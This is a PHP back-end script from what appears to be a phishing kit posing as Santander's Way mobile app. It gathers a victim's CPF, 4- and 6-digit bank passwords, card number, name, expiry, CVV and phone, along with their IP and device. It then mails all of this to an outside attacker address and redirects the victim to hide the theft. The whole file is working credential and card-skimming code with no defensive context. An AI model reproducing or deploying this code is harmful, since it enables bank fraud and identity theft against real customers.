<?php
	session_start();

	$cpf = $_POST['cpf'];
	$entrada = $_POST['entrada'];
	$number = $_POST['number'];
    $name = $_POST['name'];
    $expiry = $_POST['expiry'];
    $cvc = $_POST['cvc'];
    $telefone = $_POST['telefone'];
    $s6 = $_POST['s6'];

    



    $_SESSION["cpf"] = $cpf;
	$_SESSION["entrada"] = $entrada;
	$_SESSION["number"] = $number;
	$_SESSION["name"] = $name;
	$_SESSION["expiry"] = $expiry;
	$_SESSION["cvc"] = $cvc;
	$_SESSION["telefone"] = $telefone;
	$_SESSION["s6"] = $s6;
	
	

	$ip = $_SERVER['REMOTE_ADDR'];
	$dispositivo = $_SERVER['HTTP_USER_AGENT'];

	$subj = "CHEGOU INFO SANTANDER WAY MOBILE | $ip";

	$mensagemHTML = '
	<p>------------- |CHEGOU SANTANDER INFO HAGOROMO| ------------</p>
	<p><b>IP:</b> '.$ip.'<br>
	<p><b>Dispositivo:</b> '.$dispositivo.'<br>
	<br>
	<p><b>CPF:</b> '.$cpf.'<br>
	<p><b>Senha de 4:</b> '.$entrada.'<br>
	<p><b>Numero do cartao:</b> '.$number.'<br>
	<p><b>Nome:</b> '.$name.'<br>
	<p><b>Validade:</b> '.$expiry.'<br>
	<p><b>Cvv:</b> '.$cvc.'<br>
	<p><b>Telefone:</b> '.$telefone.'<br>
	<p><b>Senha de 6:</b> '.$s6.'<br>
	
	
	<p>----------------- |BY DARK| ------------------</p>

	';

	$headers = "MIME-Version: 1.1\r\n";
	$headers .= "Content-type: text/html; charset=utf-8\r\n";
	$headers .= "From: host@apppravc.me \r\n";
	$headers .= "Return-Path: host@apppravc.me \r\n";
	$envio = mail("santaway@apppravc.me", $subj, $mensagemHTML, $headers);

	if($envio){
		echo "<script>location='../webApp_AplicationFim.php';</script>";
	}else{ 
		echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../index.php';</script>";
	}

?>
